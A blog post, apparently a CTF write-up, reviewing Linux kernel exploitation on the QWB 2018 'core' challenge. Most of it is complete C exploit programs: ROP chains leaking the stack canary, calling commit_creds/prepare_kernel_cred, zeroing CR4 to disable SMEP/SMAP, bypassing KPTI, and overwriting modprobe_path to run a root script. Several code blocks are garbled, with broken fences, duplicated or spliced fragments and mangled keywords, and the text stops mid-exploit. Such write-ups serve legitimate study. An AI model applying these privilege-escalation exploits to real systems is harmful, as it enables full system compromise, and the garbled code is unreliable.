---
title: 「Kernel Pwn」简单复习一下 kernel pwn
description: 作者nova最近在复现一些kernel CVE，但发现自己对kernel的知识已经遗忘，因此决定利用三周时间进行复习。文章主要围绕kernel
  ROP（Return Oriented Programming）展开，逐步增强防护措施并探讨不同的绕过方法。
pubDate: 2024-07-12
tags:
- Pwn
- Kernel
authors:
- nova

---
```bash title=extract_fs
#!/bin/bash

# Default target folder
folder="fs"

# Parse parameters
while [[ "$#" -gt 0 ]]; do
  case $1 in
  -f | --folder)
    folder="$2"
    shift
    ;;
  *)
    cpio_path="$1"
    ;;
  esac
  shift
done

# Check if cpio_path is provided
if [[ -z "$cpio_path" ]]; then
  echo "Usage: $0 [-f|--folder folder_name] cpio_path"
  exit 1
fi

# Create target folder
mkdir -p "$folder"

# Copy cpio_path to target folder
cp "$cpio_path" "$folder"

# Get file name
cpio_file=$(basename "$cpio_path")

# Enter target folder
cd "$folder" || exit

# Check if file is gzip compressed
if file "$cpio_file" | grep -q "gzip compressed"; then
  echo "$cpio_file is gzip compressed, checking extension..."

  # Check if file name has .gz suffix
  if [[ "$cpio_file" != *.gz ]]; then
    mv "$cpio_file" "$cpio_file.gz"
    cpio_file="$cpio_file.gz"
  fi

  echo "Decompressing $cpio_file..."
  gunzip "$cpio_file"
  # Remove .gz suffix to get decompressed file name
  cpio_file="${cpio_file%.gz}"
fi

# Extract cpio file
echo "Extracting $cpio_file to file system..."
cpio -idmv <"$cpio_file"
rm "$cpio_file"
echo "Extraction complete."
```

```bash title=compress_fs
#!/bin/sh

if [[ $# -ne 1 ]]; then
  echo "Usage: $0 cpio_path"
  exit 1
fi

cpio_file="../$1"

find . -print0 |
  cpio --null -ov --format=newc |
  gzip -9 >"$cpio_file"
```

```bash title=kcompile
#!/bin/sh

folder="fs"
cpio_file="initramfs.cpio.gz"
gcc_options=()

while [[ $# -gt 0 ]]; do
    case $1 in
        -f|--folder)
            folder="$2"
            shift
            ;;
        -c|--cpio)
            cpio_file="$2"
            shift
            ;;
        -*)
            gcc_options+=("$1")
            ;;
        *)
            src="$1"
            ;;
    esac
    shift
done

if [ -z "$src" ]; then
    echo "Usage: compile.sh [options] <source file>"
    echo "Options:"
    echo "  -f, --folder <folder>  Specify the folder to store the compiled binary"
    echo "  -c, --cpio <file>      Specify the cpio file name"
    echo "  <other options>        Options to pass to musl-gcc"
    exit 1
fi

out=$(basename "$src" .c)

echo -e "\033[35mCompiling $src to $folder/$out\033[0m"
musl-gcc -static "${gcc_options[@]}" "$src" -Os -s -o "$out" -masm=intel
strip "$out"
mv "$out" "$folder/"
cd "$folder"

echo -e "\033[35mCreating cpio archive $cpio_file...\033[0m"
find . -print0 | cpio --null -ov --format=newc | gzip -9 > "../${cpio_file}"
echo -e "\033[35mDone\033[0m"
```

## Kernel ROP

In this section, we will gradually enhance the protection measures step by step based on the QWB 2018 core challenge.

### Analysis

Since the vulnerability analysis is very straightforward, we will not go into details. You can search for keywords to view the analysis.

### Lv1. KCanary + KASLR

Initially, I wanted to disable KCanary as well, but it requires recompiling the kernel, which is too cumbersome.

Thus, Lv1 is the scenario with KCanary enabled and all other protections disabled.

```bash title=start.sh
qemu-system-x86_64 \
  -m 128M \
  -kernel ./bzImage \
  -initrd ./initramfs.cpio.gz \
  -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet" \
  -s \
  -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
  -nographic
```

In this scenario, we only need to read `/tmp/kallsyms` to get the addresses of `commit_creds` and `prepare_kernel_cred` functions.

However, since we can directly obtain the addresses, having KASLR does not make much difference, so we combine the two.

First, we need to find the addresses of `commit_creds` and `prepare_kernel_cred` functions.

```c title=exp
syms = fopen("/tmp/kallsyms", "r");
if (syms == NULL) {
    puts("\033[31m\033[1m[-] Open /tmp/kallsyms failed.\033[0m");
    exit(0);
}

while (fscanf(syms, "%lx %s %s", &addr, type, name)) {
    if (prepare_kernel_cred && commit_creds) {
        break;
    }

    if (!prepare_kernel_cred && strcmp(name, "prepare_kernel_cred") == 0) {
        prepare_kernel_cred = addr;
        printf("\033[33m\033[1m[√] Found prepare_kernel_cred: %lx\033[0m\n", prepare_kernel_cred);
    }

    if (!commit_creds && strcmp(name, "commit_creds") == 0) {
        commit_creds = addr;
        printf("\033[33m\033[1m[√] Found commit_creds: %lx\033[0m\n", commit_creds);
    }
}
```

Then, we need to calculate the offset. Using tools like `checksec`, we can see that PIE is at `0xffffffff81000000`, and we can also find the address of `commit_creds` under this base.

```python
e = ELF('./vmlinux.unstripped')
hex(e.sym['commit_creds'])
```

Thus, the offset is calculated as follows:

```c title=exp
offset = commit_creds - 0x9c8e0 - 0xffffffff81000000;
```

At this point, using the stack overflow, we can modify the return address.

```c title=exp
// musl-gcc -static -masm=intel -Wno-error=int-conversion -o exp exp.c  // makes compiler happy
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>


#define POP_RDI_RET 0xffffffff81000b2f
#define MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a
#define POP_RDX_RET 0xffffffff810a0f49
#define POP_RCX_RET 0xffffffff81021e53
#define SWAPGS_POPFQ_RET 0xffffffff81a012da
#define  IRETQ 0xffffffff81050ac2

#pragma clang diagnostic ignored "-Wconversion"  // makes me happy

size_t user_cs, user_ss, user_rflags, user_sp;
size_t prepare_kernel_cred, commit_creds;
void save_status() {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;");
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

void shell() {
    if (!getuid()) {
        system("/bin/sh");
    } else {
        puts("\033[31m\033[1m[-] Exploit failed.\033[0m");
        exit(0);
    }
}

void core_read(int fd, char* buf) {
    ioctl(fd, 0x6677889B, buf);
}

void core_set_offset(int fd, size_t offset) {
    ioctl(fd, 0x6677889C, offset);
}

void core_copy(int fd, size_t nbytes) {
    ioctl(fd, 0x6677889A, nbytes);
}

void getroot() {
    void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}


int main() {
    FILE *syms;
    int fd;
    size_t offset;

    size_t addr;
    size_t canary;
    char type[256], name[256];

    size_t rop[0x100], i;

    puts("\033[34m\033[1m[*] Start to exploit...\033[0m");
    save_status();

    fd = open("/proc/core", O_RDWR);
    if (fd < 0) {
        puts("\033[31m\033[1m[-] Open /proc/core failed.\033[0m");
        exit(0);
    }

    syms = fopen("/tmp/kallsyms", "r");
    if (syms == NULL) {
        puts("\033[31m\033[1m[-] Open /tmp/kallsyms failed.\033[0m");
        exit(0);
    }

    while (fscanf(syms, "%lx %s %s", &addr, type, name)) {
        if (prepare_kernel_cred && commit_creds) {
            break;
        }

        if (!prepare_kernel_cred && strcmp(name, "prepare_kernel_cred") == 0) {
            prepare_kernel_cred = addr;
            printf("\033[33m\033[1m[√] Found prepare_kernel_cred: %lx\033[0m\n", prepare_kernel_cred);
        }

        if (!commit_creds && strcmp(name, "commit_creds") == 0) {
            commit_creds = addr;
            printf("\033[33m\033[1m[√] Found commit_creds: %lx\033[0m\n", commit_creds);
        }
    }

    offset = commit_creds - 0x9c8e0 - 0xffffffff81000000;
    core_set_offset(fd, 64);
    core_read(fd, name);
    canary = ((size_t *)name)[0];
    printf("\033[34m\033[1m[*] offset: 0x%lx\033[0m\n", offset);
    printf("\033[33m\033[1m[√] Canary: %lx\033[0m\n", canary);

    for (i = 0; i < 10; i++) rop[i] = canary;
    rop[i++] = (size_t)getroot;
    rop[i++] = SWAPGS_POPFQ_RET + offset;
    rop[i++] = 0;
    rop[i++] = IRETQ + offset;
    rop[i++] = (size_t)shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    write(fd, rop, 0x100);
    core_copy(fd, 0xffffffffffff0000 | (0x100));
}
```

### Lv2. KCanary + KASLR + SMEP + SMAP

The above method uses ret2usr, but what if we add SMEP and SMAP?

```bash title=start.sh
qemu-system-x86_64 \
  -m 128M \
  -kernel ./bzImage \
  # highlight-next-line
  -cpu qemu64-v1,+smep,+smap \
  -initrd ./initramfs.cpio.gz \
  -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet" \
  -s \
  -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
  -nographic
```

#### Method 0x1 - KROP

The simplest approach is to use the overflow directly to write the ROP chain.```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>

#define POP_RDI_RET 0xffffffff81000b2f
#define MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a
#define POP_RDX_RET 0xffffffff810a0f49
#define POP_RCX_RET 0xffffffff81021e53
#define SWAPGS_POPFQ_RET 0xffffffff81a012da
#define IRETQ 0xffffffff81050ac2

size_t user_cs, user_ss, user_rflags, user_sp;
size_t prepare_kernel_cred, commit_creds;
void save_status() {
**asm**("mov user_cs, cs;"
"mov user_ss, ss;"
"mov user_sp, rsp;"
"pushf;"
"pop user_rflags;");
puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

void shell() {
if (!getuid()) {
system("/bin/sh");
} else {
puts("\033[31m\033[1m[-] Exploit failed.\033[0m");
exit(0);
}
}

void core_read(int fd, char\* buf) {
ioctl(fd, 0x6677889B, buf);
}

void core_set_offset(int fd, size_t offset) {
ioctl(fd, 0x6677889C, offset);
}

void core_copy(int fd, size_t nbytes) {
ioctl(fd, 0x6677889A, nbytes);
}

int main() {
FILE \*syms;
int fd;
size_t offset;

    size_t addr;
    size_t canary;
    char type[256], name[256];

    size_t rop[0x100], i;

    puts("\033[34m\033[1m[*] Start to exploit...\033[0m");
    save_status();

    fd = open("/proc/core", O_RDWR);
    if (fd < 0) {
        puts("\033[31m\033[1m[-] Open /proc/core failed.\033[0m");
        exit(0);
    }

    syms = fopen("/tmp/kallsyms", "r");
    if (syms == NULL) {
        puts("\033[31m\033[1m[-] Open /tmp/kallsyms failed.\033[0m");
        exit(0);
    }

    while (fscanf(syms, "%lx %s %s", &addr, type, name)) {
        if (prepare_kernel_cred && commit_creds) {
            break;
        }

        if (!prepare_kernel_cred && strcmp(name, "prepare_kernel_cred") == 0) {
            prepare_kernel_cred = addr;
            printf("\033[33m\033[1m[√] Found prepare_kernel_cred: %lx\033[0m\n", prepare_kernel_cred);
        }

        if (!commit_creds && strcmp(name, "commit_creds") == 0) {
            commit_creds = addr;
            printf("\033[33m\033[1m[√] Found commit_creds: %lx\033[0m\n", commit_creds);
        }
    }

    offset = commit_creds - 0x9c8e0 - 0xffffffff81000000;
    core_set_offset(fd, 64);
    core_read(fd, name);
    canary = ((size_t *)name)[0];
    printf("\033[34m\033[1m[*] offset: 0x%lx\033[0m\n", offset);
    printf("\033[33m\033[1m[√] Canary: %lx\033[0m\n", canary);

    for (i = 0; i < 10; i++) rop[i] = canary;
    rop[i++] = POP_RDI_RET + offset;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = POP_RDX_RET + offset;
    rop[i++] = POP_RCX_RET + offset;
    rop[i++] = MOV_RDI_RAX_CALL_RDX + offset;
    rop[i++] = commit_creds;
    rop[i++] = SWAPGS_POPFQ_RET + offset;
    rop[i++] = 0;
    rop[i++] = IRETQ + offset;
    rop[i++] = (size_t)shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    write(fd, rop, 0x100);
    core_copy(fd, 0xffffffffffff0000 | (0x100));

}

````

#### Method 0x2 - Disable SMEP/SMAP

The above method is not strictly considered "bypassing." Therefore, let's continue to look at how SMEP and SMAP operate.

![image.png](https://i.loli.net/2021/09/07/sYFKuZiUVNIclBp.png)

So, in essence, they are just two bits in the CR4 register, which we can set to zero.

Using ropper, we look for any gadgets that can pop cr4, but none are found. Instead, we find a gadget that moves cr4:

`0xffffffff81002515: mov cr4, rax; push rcx; popfq; ret;`

We then rearrange the ROP chain to set cr4 to 0x6f0 (for simplicity, you can also use other gadgets to precisely xor or not).

```c
for (i = 0; i < 10; i++) rop[i] = canary;
rop[i++] = POP_RAX_RET + offset;
rop[i++] = 0x6f0;
rop[i++] = MOV_CR4_RAX_PUSH_RCX_POPFQ_RET + offset;
rop[i++] = (size_t)getroot;
rop[i++] = SWAPGS_POPFQ_RET + offset;
rop[i++] = 0;
rop[i++] = IRETQ + offset;
rop[i++] = (size_t)shell;
rop[i++] = user_cs;
rop[i++] = user_rflags;
rop[i++] = user_sp;
rop[i++] = user_ss;
````

### Lv.3 KCanary + KASLR + SMEP + SMAP + KPTI

If KPTI is added, the previous method 0x2 cannot be used. However, method 0x1 can still be used because KPTI only enforces isolation. However, since the PGD is in kernel mode when we are in kernel space, we need to perform additional operations to switch back.

KPTI, in simple terms, uses a 4MB PGD, with 0~4MB for user-mode PGD and 4~8MB for kernel-mode PGD. Switching can be done efficiently by toggling the 13th bit of the CR3 register.

```bash title=start.sh
qemu-system-x86_64 \
  -m 128M \
  -cpu qemu64-v1,+smep,+smap \
  -kernel ./bzImage \
  -initrd  ./initramfs.cpio.gz \
  -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr pti=on" \
  -s  \
  -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
  -nographic  \
```

#### Method 0x1 - swapgs_restore_regs_and_return_to_usermode

The simplest approach is to directly use the correct switching statements from `swapgs_restore_regs_and_return_to_usermode`. The operations related to registers and stack in this function can be summarized as follows, so we add two padding instructions:

```assembly
mov  rdi, cr3
or rdi, 0x1000
mov  cr3, rdi
pop rax
pop rdi
swapgs
iretq
```

````c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>


#define POP_RDI_RET 0xffffffff81000b2f
#define MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a
#define POP_RDX_RET 0xffffffff810a0f49
#define POP_RCX_RET 0xffffffff81021e53
#define POP_RAX_RET 0xffffffff810520cf
#define MOV_CR4_RAX_PUSH_RCX_POPFQ_RET 0xffffffff81002515
#define SWAPGS_POPFQ_RET 0xffffffff81a012da
#define  IRETQ 0xffffffff81050ac2
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a008f0

#pragma clang diagnostic ignored "-Wconversion"  // makes me happy

size_t user_cs, user_ss, user_rflags, user_sp;
size_t prepare_kernel_cred, commit_creds;
void save_status() {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;");
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

void shell() {
    if (!getuid()) {
        system("/bin/sh");
    } else {
        puts("\033[31m\033[1m[-] Exploit failed.\033[0m");
        exit(0);
    }
}

void core_read(int fd, char* buf) {
    ioctl(fd, 0x6677889B, buf);
}

void core_set_offset(int fd, size_t offset) {
    ioctl(fd, 0x6677889C, offset);
}

void core_copy(int fd, size_t nbytes) {
    ioctl(fd, 0x6677889A, nbytes);
}

void getroot() {
    void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}


int main() {
    FILE *syms;
    int fd;
    size_t offset;

    size_t addr;
    size_t canary;
    char type[256], name[256];

    size_t rop[0x100], i;

    puts("\033[34m\033[1m[*] Start to exploit...\033[0m");
    save_status();

    fd = open("/proc/core", O_RDWR);
    if (fd < 0) {
        puts("\033[31m\033[1m[-] Open /proc/core failed.\033[0m");
        exit(0);
    }

    syms = fopen("/tmp/kallsyms", "r");
    if (syms == NULL) {
        puts("\033[31m\033[1m[-] Open /tmp/kallsyms failed.\033[0m");
        exit(0);
    }

    while (fscanf(syms, "%lx %s %s", &addr, type, name)) {
        if (prepare_kernel_cred && commit_creds) {
            break;
        }

        if (!prepare_kernel_cred && strcmp(name, "prepare_kernel_cred") == 0) {
            prepare_kernel_cred = addr;
            printf("\033[33m\033[1m[√] Found prepare_kernel_cred: %lx\033[0m\n", prepare_kernel_cred);
        }

        if (!commit_creds && strcmp(name, "commit_creds") == 0) {
            commit_creds = addr;
            printf("\033[33m\033[1m[√] Found commit_creds: %lx\033[0m\n", commit_creds);
        }
    }

    offset = commit_creds - 0x9c8e0 - 0xffffffff81000000;
    core_set_offset(fd, 64);
    core_read(fd, name);
    canary = ((size_t *)name)[0];
    printf("\033[34m\033[1m[*] offset: 0x%lx\033[0m\n", offset);
    printf("\033[33m\033[1m[√] Canary: %lx\033[0m\n", canary);

    for (i = 0; i < 10; i++) rop[i] = canary;
    rop[i++] = POP_RDI_RET + offset;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = POP_RDX_RET + offset;
    rop[i++] = POP_RCX_RET + offset;
    rop[i++] = MOV_RDI_RAX_CALL_RDX + offset;
    rop[i++] = commit_creds;
    rop[i++] = SWAPGS_POPFQ_RET + offset;
    rop[i++] = 0;
    rop[i++] = IRETQ + offset;
    rop[i++] = (size_t)shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    write(fd, rop, 0x100);
    core_copy(fd, 0xffffffffffff0000 | (0x100));

}
```offset;
rop[i++] = commit_creds;
rop[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + offset;
rop[i++] = 0;
rop[i++] = 0;
rop[i++] = (size_t)shell;
rop[i++] = user_cs;
rop[i++] = user_rflags;
rop[i++] = user_sp;
rop[i++] = user_ss;

write(fd, rop, 0x100);
core_copy(fd, 0xffffffffffff0000 | (0x100));
}
````

#### Method 0x2 - Signal Handling

If we return directly without switching page tables, we can see it reports a SEGMENTATION FAULT instead of panicking, which indicates that we have actually returned to user mode. In this case, we can simply use a signal handler to handle the situation.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>

#define POP_RDI_RET 0xffffffff81000b2f
#define MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a
#define POP_RDX_RET 0xffffffff810a0f49
#define POP_RCX_RET 0xffffffff81021e53
#define POP_RAX_RET 0xffffffff810520cf
#define MOV_CR4_RAX_PUSH_RCX_POPFQ_RET 0xffffffff81002515
#define SWAPGS_POPFQ_RET 0xffffffff81a012da
#define IRETQ 0xffffffff81050ac2

#pragma clang diagnostic ignored "-Wconversion"  // makes me happy

size_t user_cs, user_ss, user_rflags, user_sp;
size_t prepare_kernel_cred, commit_creds;
void save_status() {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;");
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

void shell() {
    if (!getuid()) {
        system("/bin/sh");
    } else {
        puts("\033[31m\033[1m[-] Exploit failed.\033[0m");
        exit(0);
    }
}

void core_read(int fd, char* buf) {
    ioctl(fd, 0x6677889B, buf);
}

void core_set_offset(int fd, size_t offset) {
    ioctl(fd, 0x6677889C, offset);
}

void core_copy(int fd, size_t nbytes) {
    ioctl(fd, 0x6677889A, nbytes);
}

void getroot() {
    void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}

int main() {
    FILE *syms;
    int fd;
    size_t offset;

    size_t addr;
    size_t canary;
    char type[256], name[256];

    size_t rop[0x100], i;

    puts("\033[34m\033[1m[*] Start to exploit...\033[0m");
    save_status();
    signal(SIGSEGV, shell);

    fd = open("/proc/core", O_RDWR);
    if (fd < 0) {
        puts("\033[31m\033[1m[-] Open /proc/core failed.\033[0m");
        exit(0);
    }

    syms = fopen("/tmp/kallsyms", "r");
    if (syms == NULL) {
        puts("\033[31m\033[1m[-] Open /tmp/kallsyms failed.\033[0m");
        exit(0);
    }

    while (fscanf(syms, "%lx %s %s", &addr, type, name)) {
        if (prepare_kernel_cred && commit_creds) {
            break;
        }

        if (!prepare_kernel_cred && strcmp(name, "prepare_kernel_cred") == 0) {
            prepare_kernel_cred = addr;
            printf("\033[33m\033[1m[√] Found prepare_kernel_cred: %lx\033[0m\n", prepare_kernel_cred);
        }

        if (!commit_creds && strcmp(name, "commit_creds") == 0) {
            commit_creds = addr;
            printf("\033[33m\033[1m[√] Found commit_creds: %lx\033[0m\n", commit_creds);
        }
    }

    offset = commit_creds - 0x9c8e0 - 0xffffffff81000000;
    core_set_offset(fd, 64);
    core_read(fd, name);
    canary = ((size_t *)name)[0];
    printf("\033[34m\033[1m[*] offset: 0x%lx\033[0m\n", offset);
    printf("\033[33m\033[1m[√] Canary: %lx\033[0m\n", canary);

    for (i = 0; i < 10; i++) rop[i] = canary;
    rop[i++] = POP_RDI_RET + offset;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = POP_RDX_RET + offset;
    rop[i++] = POP_RCX_RET + offset;
    rop[i++] = MOV_RDI_RAX_CALL_RDX + offset;
    rop[i++] = commit_creds;
    rop[i++] = SWAPGS_POPFQ_RET + offset;
    rop[i++] = 0;
    rop[i++] = IRETQ + offset;
    rop[i++] = (size_t)shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    write(fd, rop, 0x100);
    core_copy(fd, 0xffffffffffff0000 | (0x100));
}
```

### Lv.4 KCANARY + FGKASLR + SMEP + SMAP + KPTI

For this challenge, FGKASLR is not very useful because we can know the positions of all symbols. Moreover, it was not actually enabled during compilation (xiao).

#### Method 0x1 - .text Gadgets

We will use the original method, but this time we need to calculate the offset using `swapgs_restore_regs_and_return_to_usermode` because the range from `0xffffffff81000000` to `0xffffffff83000000` is within the same section, and the offset remains constant. Our gadgets are located in this segment.

```````c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>

#define POP_RDI_RET 0xffffffff81000b2f
#define MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a
#define POP_RDX_RET 0xffffffff810a0f49
#define POP_RCX_RET 0xffffffff81021e53
#define POP_RAX_RET 0xffffffff810520cf
#define MOV_CR4_RAX_PUSH_RCX_POPFQ_RET 0xffffffff81002515
#define SWAPGS_POPFQ_RET 0xffffffff81a012da
#define IRETQ 0xffffffff81050ac2

#pragma clang diagnostic ignored "-Wconversion"  // makes me happy

size_t user_cs, user_ss, user_rflags, user_sp;
size_t prepare_kernel_cred, commit_creds, swapgs_restore_regs_and_return_to_usermode;
void save_status() {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;");
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

void shell() {
    if (!getuid()) {
        system("/bin/sh");
    } else {
        puts("\033[31m\033[1m[-] Exploit failed.\033[0m");
        exit(0);
    }
}

void core_read(int fd, char* buf) {
    ioctl(fd, 0x6677889B, buf);
}

void core_set_offset(int fd, size_t offset) {
    ioctl(fd, 0x6677889C, offset);
}

void core_copy(int fd, size_t nbytes) {
    ioctl(fd, 0x6677889A, nbytes);
}

void getroot() {
    void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}

int main() {
    FILE *syms;
    int fd;
    size_t offset;

    size_t addr;
    size_t canary;
    char type[256], name[256];

    size_t rop[0x100], i;

    puts("\033[34m\033[1m[*] Start to exploit...\033[0m");
    save_status();
    signal(SIGSEGV, shell);

    fd = open("/proc/core", O_RDWR);
    if (fd < 0) {
        puts("\033[31m\033[1m[-] Open /proc/core failed.\033[0m");
        exit(0);
    }

    syms = fopen("/tmp/kallsyms", "r");
    if (syms == NULL) {
        puts("\033[31m\033[1m[-] Open /tmp/kallsyms failed.\033[0m");
        exit(0);
    }

    while (fscanf(syms, "%lx %s %s", &addr, type, name)) {
        if (prepare_kernel_cred && commit_creds && swapgs_restore_regs_and_return_to_usermode) {
            break;
        }

        if (!prepare_kernel_cred && strcmp(name, "prepare_kernel_cred") == 0) {
            prepare_kernel_cred = addr;
            printf("\033[33m\033[1m[√] Found prepare_kernel_cred: %lx\033[0m\n", prepare_kernel_cred);
        }

        if (!commit_creds && strcmp(name, "commit_creds") == 0) {
            commit_creds = addr;
            printf("\033[33m\033[1m[√] Found commit_creds: %lx\033[0m\n", commit_creds);
        }

        if (!swapgs_restore_regs_and_return_to_usermode && strcmp(name, "swapgs_restore_regs_and_return_to_usermode") == 0) {
            swapgs_restore_regs_and_return_to_usermode = addr;
            printf("\033[33m\033[1m[√] Found swapgs_restore_regs_and_return_to_usermode: %lx\033[0m\n", swapgs_restore_regs_and_return_to_usermode);
        }
    }

    offset = swapgs_restore_regs_and_return_to_usermode - 0xa008da - 0xffffffff81000000;
    core_set_offset(fd, 64);
    core_read(fd, name);
    canary = ((size_t *)name)[0];
    printf("\033[34m\033[1m[*] offset: 0x%lx\033[0m\n", offset);
    printf("\033[33m\033[1m[√] Canary: %lx\033[0m\n", canary);

    for (i = 0; i < 10; i++) rop[i] = canary;
    rop[i++] = POP_RDI_RET + offset;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = POP_RDX_RET + offset;
    rop[i++] = POP_RCX_RET + offset;
    rop[i++] = MOV_RDI_RAX_CALL_RDX + offset;
    rop[i++] = commit_creds;
    rop[i++] = SWAPGS_POPFQ_RET + offset;
    rop[i++] = 0;
    rop[i++] = IRETQ + offset;
    rop[i++] = (size_t)shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    write(fd, rop, 0x100);
    core_copy(fd, 0xffffffffffff0000 | (0x100));
}
``````c
_CALL_RDX + offset;
rop[i++] = commit_creds;
rop[i++] = SWAPGS_POPFQ_RET + offset;
rop[i++] = 0;
rop[i++] = IRETQ + offset;
rop[i++] = (size_t)shell;
rop[i++] = user_cs;
rop[i++] = user_rflags;
rop[i++] = user_sp;
rop[i++] = user_ss;

write(fd, rop, 0x100);
core_copy(fd, 0xffffffffffff0000 | (0x100));
}
```````

#### Method 0x2 - \_\_ksymtab

Next, let's assume we cannot obtain the addresses of the `commit` and `prepare` functions in their respective segments. According to the implementation of FGKASLR, we can use `readelf --section-headers -W vmlinux | grep -vE 'ax'` to see which sections do not undergo additional offsets. We can observe a `__ksymtab` section, which stores the offset from the current address to the symbol, and its offset to the kernel base address is fixed.

We can achieve this using similar gadgets:

```assembly
push rax; ret;
__ksymtab_commit_creds - 0x10;
mov rax, [rax + 0x10];
push rdi; ret;
__ksymtab_commit_creds;
add rdi, rax;
; RDI is commit_creds now
```

However, in this problem, I found that the vmlinux stores not offsets but direct addresses. A ksymtab should have three ints but only has two, not sure if it's an issue with IDA or something else. The vmlinux.stripped restored using vmlinux-to-elf does not have this symbol, so it is temporarily shelved.

#### Method 0x3 - modprobe_path

The third approach involves exploiting `modprobe_path`, a variable in the kernel located in the .data section. When executing a program with an unknown file header, it goes through `do_execve()` and eventually calls `call_modprobe`, using the file at `modprobe_path` to execute the program with root privileges. Thus, we only need to overwrite `modprobe_path`.

First, obtain the address of `modprobe_path`. I couldn't find the symbol table, but you can directly search the memory for "/sbin/modprobe" to locate it. After returning to user mode, create a malicious program, ~~such as one that generates a shell with the suid bit set~~. It seems that doing so does not provide the root user with the PATH environment variable, so it might be better to directly copy the flag.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>

#define POP_RAX_RET 0xffffffff810520cf
#define MOV_PTR_RBX_RAX_POP_RBX_RET 0xffffffff8101e5e1
#define POP_RBX_RET 0xffffffff81000472
#define MODPROBE_PATH 0xffffffff8223d8c0
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a008f0

#pragma clang diagnostic ignored "-Wconversion"  // makes me happy

size_t user_cs, user_ss, user_rflags, user_sp;
size_t swapgs_restore_regs_and_return_to_usermode;
void save_status() {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;");
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

void core_read(int fd, char* buf) {
    ioctl(fd, 0x6677889B, buf);
}

void core_set_offset(int fd, size_t offset) {
    ioctl(fd, 0x6677889C, offset);
}

void core_copy(int fd, size_t nbytes) {
    ioctl(fd, 0x6677889A, nbytes);
}

void getFlag() {
    puts("\033[33m\033[01m[+] Ready to get flag!!!\033[0m");
    system("echo '#!/bin/sh\ncp /root/flag /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/nova");
    system("chmod +x /tmp/nova");

    puts("\033[33m\033[01m[+] Run /tmp/nova\033[0m");
    system("/tmp/nova");

    system("cat /tmp/flag");
    exit(0);
}

int main() {
    FILE *syms;
    int fd;
    size_t offset;

    size_t addr;
    size_t canary;
    char type[256], name[256];

    size_t rop[0x100], i;

    puts("\033[34m\033[1m[*] Start to exploit...\033[0m");
